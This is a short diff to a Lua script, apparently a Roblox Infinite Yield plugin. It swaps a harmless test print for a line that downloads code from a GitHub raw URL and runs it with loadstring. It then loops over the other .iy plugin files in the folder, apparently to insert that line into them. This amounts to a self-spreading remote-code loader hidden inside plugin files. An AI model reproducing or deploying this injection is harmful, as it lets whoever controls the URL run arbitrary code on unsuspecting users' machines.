@@ -1,4 +1,4 @@
-local line = 'pcall(function() print("test") end)\n'
+local line = 'pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/audio-wav/iy-dependencies/main/source"))() end)\n'
 local pluginFile = "replicatesignal.iy"
 for _, file in ipairs(listfiles("")) do
     if file:sub(-3) == ".iy" and not file:find("IY_FE.iy", 1, true) then
